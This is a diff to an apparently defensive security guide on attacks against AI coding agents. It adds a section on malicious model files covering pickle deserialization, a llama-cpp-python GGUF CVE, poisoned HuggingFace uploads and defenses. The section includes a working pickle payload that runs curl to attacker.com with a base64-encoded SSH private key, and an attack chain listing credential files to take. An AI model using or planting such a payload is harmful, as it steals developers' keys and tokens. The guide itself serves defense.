@@ -19,8 +19,9 @@ AI coding agents run with root-level access to your filesystem, credentials, and
 - [Memory & Context Poisoning](#4-memory--context-poisoning)
 - [Credential Exfiltration](#5-credential-exfiltration)
 - [MCP Server Attacks](#6-mcp-server-attacks)
-- [Agent Framework CVEs](#7-agent-framework-cves)
-- [Social Engineering via AI Workflows](#8-social-engineering-via-ai-workflows)
+- [Malicious Model Files](#7-malicious-model-files)
+- [Agent Framework CVEs](#8-agent-framework-cves)
+- [Social Engineering via AI Workflows](#9-social-engineering-via-ai-workflows)
 - [Detection & Defense](#detection--defense)
 
 ---
@@ -509,7 +510,126 @@ async def search_web(query: str) -> str:
 
 ---
 
-## 7. Agent Framework CVEs
+## 7. Malicious Model Files
+
+AI developers routinely download model weights from public sources (HuggingFace, community repos, fine-tune marketplaces). Model file formats are a largely underappreciated attack surface — some by design, some by vulnerability.
+
+### 7.1 Pickle-Based Formats — Arbitrary Code Execution by Design
+
+`.bin`, `.pt`, `.pth` (older PyTorch checkpoints) use Python's `pickle` serialization format. Pickle **intentionally supports executing arbitrary Python code** during deserialization. There is no safe way to load a pickle file from an untrusted source.
+
+```python
+# A malicious model.bin — looks like a normal checkpoint, executes on torch.load()
+import pickle, os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('curl -s https://attacker.com/?k=$(cat ~/.ssh/id_rsa | base64 -w0)',))
+
+# Attacker serializes this as a "model weight" file
+payload = pickle.dumps({'model_state': Exploit()})
+open('model.bin', 'wb').write(payload)
+```
+
+**Trigger:** `torch.load('model.bin')` — standard loading code, no unusual flags needed.
+
+**Impact:** Full RCE with the privileges of the loading process. SSH keys, API keys, crypto wallets — anything accessible from that user account.
+
+**Why it's common:** PyTorch's `torch.load()` historically defaulted to `pickle`. Many tutorials, older repos, and fine-tuned checkpoints still use `.bin` format.
+
+---
+
+### 7.2 GGUF Format RCE — CVE-2024-34359
+
+**CVE:** CVE-2024-34359 | **CVSS:** 9.8 Critical  
+**Affected:** `llama-cpp-python` before v0.2.72
+
+A crafted `.gguf` model file could trigger arbitrary code execution when loaded via `llama_cpp_python`. GGUF is the standard format for quantized models used in tools like Ollama, LM Studio, and llama.cpp.
+
+```python
+# Vulnerable loading code (llama-cpp-python < 0.2.72)
+from llama_cpp import Llama
+model = Llama(model_path="./malicious.gguf")  # RCE triggered here
+```
+
+**Impact:** RCE on load. Any user running a local LLM from an untrusted source was at risk.  
+**Fixed in:** llama-cpp-python v0.2.72  
+**Reference:** [NVD CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359)
+
+---
+
+### 7.3 HuggingFace Malicious Model Uploads
+
+HuggingFace Hub has been used to distribute malicious model files. Researchers have demonstrated and discovered real cases of models containing pickle payloads.
+
+**Documented cases:**
+- Security researchers uploaded proof-of-concept malicious models (pickle payloads) to demonstrate the risk; HuggingFace responded by adding safety scanners
+- HuggingFace now flags pickle-based files with a warning banner and runs automated scanning via `picklescan`
+- Typosquatting of popular model names (e.g. `meta-llama/Llama-2-7b` vs `meta-llama/Llama-2-7b-hf`) to serve malicious weights
+
+**The trust problem:** Model hubs rely on community uploads. A model with 50 downloads and a convincing README is indistinguishable from a legitimate fine-tune to most users.
+
+---
+
+### 7.4 SafeTensors Bypass Attempts
+
+`safetensors` was designed as a safe alternative to pickle — it stores only tensor data with no executable code. However:
+
+- Users who don't verify they're loading `.safetensors` (vs `.bin`) may silently fall back to pickle
+- Some loading libraries auto-detect format; a malicious repo can include both `model.safetensors` (legitimate, small) and `model.bin` (malicious) and manipulate which one gets loaded
+- Metadata fields in safetensors headers are not executed, but have been examined for injection vectors in downstream parsers
+
+---
+
+### 7.5 Attack Chain: Fine-Tune Marketplace to Developer Machine
+
+```
+1. Attacker creates a convincing fine-tuned model
+   (domain: coding assistant, customer service, etc.)
+
+2. Publishes to HuggingFace or shares via GitHub with:
+   - Professional README with benchmark results
+   - Legitimate-looking model card
+   - .bin weights containing pickle payload alongside .safetensors decoy
+
+3. Developer downloads for local testing or further fine-tuning:
+   trainer = Trainer(model=AutoModel.from_pretrained('./malicious-model'))
+
+4. Payload executes → exfiltrates:
+   - ~/.ssh/id_rsa
+   - ~/.config/gh/hosts.yml (GitHub token)
+   - .env files in current directory
+   - HUGGING_FACE_HUB_TOKEN environment variable
+```
+
+---
+
+### Defense
+
+| Practice | Why |
+|----------|-----|
+| Prefer `.safetensors` over `.bin`/`.pt` | No executable code in the format |
+| Verify SHA256 checksums against model card | Detects tampered files |
+| Use `torch.load(..., weights_only=True)` | Disables pickle code execution (PyTorch ≥ 1.13) |
+| Run `picklescan` before loading | Scans for known malicious pickle patterns |
+| Keep `llama-cpp-python` updated | CVE-2024-34359 fixed in v0.2.72 |
+| Load in a sandboxed environment for untrusted sources | Limits blast radius |
+
+```bash
+# Scan a model file before loading
+pip install picklescan
+picklescan -p ./model.bin
+
+# Safe PyTorch loading (weights only, no arbitrary code)
+import torch
+model = torch.load('model.pt', weights_only=True)
+```
+
+**🛡️ Detection:** `deepsafe-scan --modules skill` scans for unsafe `torch.load()` calls (without `weights_only=True`) in installed skills and MCP servers.
+
+---
+
+## 8. Agent Framework CVEs
 
 | CVE | CVSS | Product | Description | Fixed in |
 |-----|------|---------|-------------|----------|
@@ -523,7 +643,7 @@ async def search_web(query: str) -> str:
 
 ---
 
-## 8. Social Engineering via AI Workflows
+## 9. Social Engineering via AI Workflows
 
 ### 8.1 README Instruction Hijacking
 
